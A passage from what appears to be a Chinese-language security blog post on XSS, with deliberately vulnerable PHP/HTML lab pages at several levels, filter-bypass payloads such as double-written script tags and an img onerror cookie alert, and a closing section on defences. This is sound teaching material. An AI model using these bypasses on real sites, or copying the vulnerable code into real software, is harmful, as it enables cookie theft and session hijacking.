        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之XSS漏洞实战学习</title>
    <url>/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Web安全学习之XSS漏洞实战学习">Web安全学习之XSS漏洞实战学习</h1>
<ol>
<li>编写一个存在 xss 漏洞的页面</li>
<li>利用 xss 漏洞获取当前用户 cookie</li>
<li>思考，利用 xss 漏洞能干嘛（参考 beef）</li>
<li>扩展学习：学习如何防御 xss、总结防御策略加到报告里</li>
</ol>
<blockquote>
<p>要求：记录编写的页面代码、操作流程、思考总结</p>
</blockquote>
<h2 id="0x01-XSS漏洞">0x01 XSS漏洞</h2>
<p>XSS(Cross Site Scripting)跨站脚本攻击，也是一种注入攻击，当web应用对用户输入过滤不严格，攻击者写入恶意的脚本代码（HTML、JavaScript）到网页中时，如果用户访问了含有恶意代码的页面，恶意脚本就会被浏览器解析执行导致用户被攻击。</p>
<p>常见的危害有：cookie窃取，session劫持，钓鱼攻击，蠕虫，ddos等。</p>
<h2 id="0x02-XSS漏洞分类和代码案例">0x02 XSS漏洞分类和代码案例</h2>
<h3 id="反射型XSS">反射型XSS</h3>
<h4 id="原理">原理</h4>
<p>反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称”非持久性xss”。</p>
<h4 id="代码案例">代码案例</h4>
<ol>
<li>
<p>Low Level</p>
<p>漏洞代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;Test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>漏洞利用：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191109155810.png" alt=""></p>
</li>
<li>
<p>Medium Level</p>
<p>漏洞代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (array_key_exists(&quot;name&quot;, $_GET) &amp;&amp; $_GET[&#39;name&#39;] !&#x3D; NULL) &#123;</span><br><span class="line">	$name &#x3D; str_replace(&#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(&quot;Medium&quot;, &quot;CookieTest&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>漏洞利用：</p>
<ul>
<li>双写<code>&lt;script&gt;</code>标签：<code>&lt;s&lt;script&gt;cript&gt;</code></li>
<li>标签转换大小写：<code>&lt;SCRipt&gt;</code></li>
</ul>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191109160026.png" alt=""></p>
</li>
<li>
<p>High Level</p>
<p>漏洞代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>漏洞利用：</p>
<p>这里使用了正则表达式过滤了<code>&lt;script&gt;</code>标签， 这时候不论是大小写、双层<code>&lt;script&gt;</code>都无法绕过，此时可以使用别的标签，比如<code>&lt;img&gt;</code>。</p>
<p>payload：<code> &lt;img src=0 onerror=alert(document.cookie)&gt; </code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191109160653.png" alt=""></p>
</li>
</ol>
<h3 id="存储型XSS">存储型XSS</h3>
<h4 id="原理-v2">原理</h4>
<p>允许用户提交数据的Web应用程序都有可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器接收并存储，当攻击者再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这就是存储型XSS。</p>
<h4 id="代码案例-v2">代码案例</h4>
<ol>
<li>
<p>Low Level</p>
<p>前端页面代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">name</span>=<span class="string">&quot;guestform&quot;</span> <span class="attr">action</span>=<span class="string">&quot;low.php&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">cellpadding</span>=<span class="string">&quot;2&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span>Name *<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;txtName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span>Message *<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;mtxMessage&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;50&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;3&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;50&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;btnSign&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Sign Guestbook&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">   $username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $dbname = <span class="string">&quot;security&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 创建连接</span></span><br><span class="line">   $conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line">   <span class="comment">// 检测连接</span></span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;数据库连接失败: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">   &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;数据库连接成功&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> $_POST[<span class="string">&#x27;mtxMessage&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">   $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line"></span><br><span class="line">   $message = stripslashes( $message ); </span><br><span class="line">   $message = mysqli_real_escape_string( $message ); </span><br><span class="line"></span><br><span class="line">   $name = mysqli_real_escape_string( $name ); </span><br><span class="line">  </span><br><span class="line">   $sql = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;SQL插入语句：&quot;</span>.$sql;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $sql . <span class="string">&quot;&lt;br&gt;&quot;</span> . $conn-&gt;error;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>相关函数介绍：</p>
<p><code>trim(string,charlist)</code>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
<p><code>mysqli_real_escape_string(string,connection)</code>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
<p><code>stripslashes(string)</code>函数删除字符串中的反斜杠。</p>
<p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p>
<p>对<code>Message</code>字段注入XSS代码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191108094643.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191108094728.png" alt=""></p>
<p>由于Name字段在前端有字数限制，可以直接使用Burp Suite抓包修改参数。</p>
</li>
<li>
<p>Medium Level</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">   $username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $dbname = <span class="string">&quot;security&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 创建连接</span></span><br><span class="line">   $conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line">   <span class="comment">// 检测连接</span></span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">   &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;数据库连接成功&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> $_POST[<span class="string">&#x27;mtxMessage&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">   $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line"></span><br><span class="line">   $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">   $message = mysqli_real_escape_string( $message ); </span><br><span class="line">   $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">   $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name ); </span><br><span class="line">   $name = mysqli_real_escape_string( $name );  </span><br><span class="line">  </span><br><span class="line">   $sql = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;SQL插入语句：&quot;</span>.$sql;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//$result = mysqli_query($query) or die(&#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; );</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $sql . <span class="string">&quot;&lt;br&gt;&quot;</span> . $conn-&gt;error;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>相关函数介绍：</p>
<p><code>htmlspecialchars</code>：将特殊字符转换为 HTML 实体</p>
<table>
<thead>
<tr>
<th style="text-align:left">字符</th>
<th style="text-align:left">替换后</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>&amp;</em></td>
<td style="text-align:left">&amp;amp;</td>
</tr>
<tr>
<td style="text-align:left"><em>&quot;</em></td>
<td style="text-align:left">&amp;quot;，除非设置了 <strong><code>ENT_NOQUOTES</code></strong></td>
</tr>
<tr>
<td style="text-align:left"><em>’</em></td>
<td style="text-align:left">设置了 <strong><code>ENT_QUOTES</code></strong> 后， &amp;#039;(如果是 <strong><code>ENT_HTML401</code></strong>) ，或者 &amp;apos;(如果是 <strong><code>ENT_XML1</code></strong>、 <strong><code>ENT_XHTML</code></strong> 或 <strong><code>ENT_HTML5</code></strong>)。</td>
</tr>
<tr>
<td style="text-align:left"><em>&lt;</em></td>
<td style="text-align:left">&amp;lt;</td>
</tr>
<tr>
<td style="text-align:left"><em>&gt;</em></td>
<td style="text-align:left">&amp;gt;</td>
</tr>
</tbody>
</table>
<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。跟反射型XSS一样，可以抓包修改参数使用<strong>双写绕过</strong>或<strong>大小写混淆绕过</strong>。</p>
</li>
<li>
<p>High Level</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">   $username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   $dbname = <span class="string">&quot;security&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// 创建连接</span></span><br><span class="line">   $conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line">   <span class="comment">// 检测连接</span></span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">   &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;数据库连接成功&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> $_POST[<span class="string">&#x27;mtxMessage&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] ); </span><br><span class="line">   $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] ); </span><br><span class="line"></span><br><span class="line">   $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">   $message = mysqli_real_escape_string( $message ); </span><br><span class="line">   $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">   $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name ); </span><br><span class="line">   $name = mysqli_real_escape_string( $name );  </span><br><span class="line">  </span><br><span class="line">   $sql = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;SQL插入语句：&quot;</span>.$sql;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> ($conn-&gt;query($sql) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $sql . <span class="string">&quot;&lt;br&gt;&quot;</span> . $conn-&gt;error;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，这里使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是却忽略了<code>img</code>、<code>iframe</code>等其它危险的标签，因此name参数依旧存在存储型XSS。 同样抓包修改name参数为<code> &lt;img src=1 onerror=alert(\xss\)&gt; </code></p>
</li>
</ol>
<h3 id="DOM型XSS">DOM型XSS</h3>
<h4 id="原理-v3">原理</h4>
<p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
<p>由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要于服务器端交互，它只发生在客户端处理数据的阶段。</p>
<h4 id="代码案例-v3">代码案例</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test DOM_XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">replace</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;id1&quot;</span>).innerHTML = <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom_input&quot;</span>).value;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h6</span> <span class="attr">id</span>=<span class="string">&quot;id1&quot;</span>&gt;</span>这里会显示输入的内容<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dom_input&quot;</span> <span class="attr">value</span>=<span class="string">&quot;输入&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;替换&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;replace()&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191108133505.png" alt=""></p>
<h2 id="0x03-XSS漏洞防御">0x03 XSS漏洞防御</h2>
<p>因为XSS漏洞涉及输入和输出两个部分，所以其修复也分为两种。</p>
<ul>
<li>过滤输入的数据，包括<code>'</code>’，<code>&quot;</code>，<code>&lt;</code>，<code>&gt;</code>，<code>on*</code>等非法字符。</li>
<li>对输入到页面的数据进行相应的编码转换，包括HTML实体编码、Javascript编码等。</li>
</ul>
<h3 id="HttpOnly">HttpOnly</h3>
<p>HttpOnly主要防御的是XSS漏洞中的Cookie劫持，浏览器禁止页面的JavaScript访问带有HttpOnly属性的Cookie。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;? php</span><br><span class="line">setcookie(&quot;cookie1&quot;, &quot;test1&quot;, NULL, NULL, NULL, NULL, FALSE);</span><br><span class="line">setcookie(&quot;cookie2&quot;, &quot;test2&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">	alert(document.cookie);</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这段代码中，cookie1没有HttpOnly，cookie2被标记为HttpOnly。</p>
<h3 id="输入检查（XSS-Filter）">输入检查（XSS Filter）</h3>
<p>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、&quot;等。如果发现存在特殊字符，则将这些字符过滤或者编码。比较智能的输入检查还会匹配XSS的特征，比如查找用户数据中是否包含了<code>&lt;script&gt;</code>、<code>javascript</code>等敏感字符。而且输入检查的逻辑必须放在服务器端代码实现。</p>
<p>但是XSS Filter有一个问题，就是对&quot;&lt;&quot;、&quot;&gt;&quot;等字符的处理，可能会改变用户输入数据的语义。并且，输入的数据会被展示在多个地方，每个地方的语境各不相同，例如：</p>
<p>用户输入的昵称如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$nickname = <span class="string">&#x27;我是&quot;天才&quot;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果被XSS Filter转义后：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$nickname = <span class="string">&#x27;我是\&quot;天才\&quot;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果在HTML代码中展示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是\&quot;天才\&quot;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果在JavaScript代码展示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nick = <span class="string">&#x27;我是\&quot;天才\&quot;&#x27;</span>;</span><br><span class="line"><span class="built_in">document</span>.write(nick);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="输出检查">输出检查</h3>
<p>一般来说，除了富文本的输出，在变量输入到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>
<h3 id="HTMLEncode">HTMLEncode</h3>
<p>针对HTML代码的编码方式是HtmlEncode，在HtmlEncode中要求至少转换：<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>'</code>、<code>\</code>。</p>
<p>在PHP中，有<code>htmlentities()</code>和<code>htmlspecialchars()</code>两个函数可以满足安全要求。</p>
<h3 id="JavaScriptEncode">JavaScriptEncode</h3>
<p>JavaScriptEncode需要使用<code>\</code>对特殊字符进行转义，而且在对抗XSS漏洞时，还要求输出的变量必须在引号内部，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = escapeJavaScript($evil);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">&#x27;&quot;&#x27;</span>+escapeJavaScript($evil)+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果输入的是<code>1; alert(2)</code>，则：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>; alert(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">&quot;1; alert(2)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>第一行执行了额外的代码，第二行则是安全的。</p>
<p>或者也可以使用更加严格的JavaScriptEncode函数来保证安全——除了数字和字母外的所有字符，都使用十六进制<code>\xHH</code>的方式进行编码，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>\x3balert\x282\x29;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
